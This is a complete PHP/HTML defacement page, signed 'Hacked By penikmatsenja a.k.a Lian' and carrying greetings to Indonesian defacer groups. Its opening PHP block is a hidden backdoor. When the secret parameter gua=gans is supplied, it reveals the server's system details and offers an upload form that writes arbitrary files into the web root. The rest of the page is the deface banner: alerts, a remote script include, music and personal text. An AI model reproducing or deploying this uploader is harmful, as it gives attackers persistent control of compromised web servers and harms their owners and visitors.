
<?php
if($_GET['gua'] == 'gans')
{
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='idx_file'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "gagal upload di document root.";
		}
	} else {
		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
			echo "sukses tusbol <b>$files</b> di folder ini";
		} else {
			echo "gagal upload gagal ngentod !";
		}
	}
}
}
?>
<html>
<head>
	<script>
		alert(" Fine :)")
	</script>
<title>Why?</title>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
<meta name="keywords" content="[+] Hacked [+]"/>
<meta name="description" content="[+] Hacked [+]">
<meta name="author" content="[+] Hacked [+]">
<meta name="googlebot" content="all,index,follow">
<meta name="robots" content="index, follow">
<body>
<center>
<script src="http://e-mete.com/js/kdsnow.js"></script>  <style>    body{     background-image: url(index.html);     background-repeat: no-repeat;      background-attachment: fixed;      background-position: top;     background-color:white;     position: relative;     background-size:100% 100vh;          }    .logo {     width: 300px;     height: 300px;     margin: 0 auto;     margin-top: 50px;     -webkit-filter: drop-shadow(0px 0px 7px #0080FF);     filter: drop-shadow(0px 0px 7px #0080FF);    }    .logo:hover{     width: 300px;     height: 300px;     -webkit-filter: drop-shadow(0px 0px 10px #0080FF);     opacity:0.4;     filter:alpha(opacity=40);     transition: opacity .2s ease-out;     -moz-transition: opacity .2s ease-out;     -webkit-transition: opacity .2s ease-out;     -o-transition: opacity .2s ease-out;    }    .defacedby{     font-family: Megrim;     text-align: center;     color: black;     font-weight: bold;     font-size: 50px;   text-shadow: #0080FF 1px 2px 1px;        }    .glow {     font-family: Quicksand;     text-align: center;     color: grey;     font-style: bold;     font-size: 15px;    margin-top: 16px;    text-shadow: black 1px 2px 1px;        }    .greetings{     font-family: Quicksand;     text-align: center;     color: #ffffff;     font-size: 15px;     margin-top: 50px; text-shadow: black 1px 2px 1px;    }    </style>   </head>    <body>   <script>    alert('Game Over~')   </script>   <center>
    <a imageanchor="1" style="margin-left: 1em; margin-right: 1em;">
<body bgcolor='white'><br>
	<center>
	<iframe width="40%" height="100" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/489988995&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true"></iframe>
<center>	
	<fint face='monospace' size=4px>I Am Fine :)</fint>
	<center>
<img src='https://pbs.twimg.com/profile_images/877205650224406528/_bDotn_T_400x400.jpg' height='285'><br><br>
<centeR>
<font face='monospace' size=4px>Hacked By penikmatsenja a.k.a Lian<br> Maaf Jika Nanti Pada Akhirnya Aku Cuek Kepadamu  <br> Mungkin Aku Saja Yang Mencintaimu Terlalu Dalam Tetapi Kamu Tidak :) <br>  Dan Juga Mungkin Benar Hidupmu Tidak Selalu Tentangku Dan Untukku :) <br>Blackdeat - Whitedeath - ONEFRI3NDS - NubyChan - KingCyberTron - J4N9KR1K - TehTawar404 - TehJawa404 - TehSariwangi404 - ./R4D1AN - Ikari404 - Univers-ID - Cy#b3r00T - Mr.Cakil - ./Sn00py - MR.W4HYU - Mr.Jho - BH3N0T - TN72 - Mantoed <br> All Defacer Indonesia <br><br> </font>
</head>
</body>
</html>
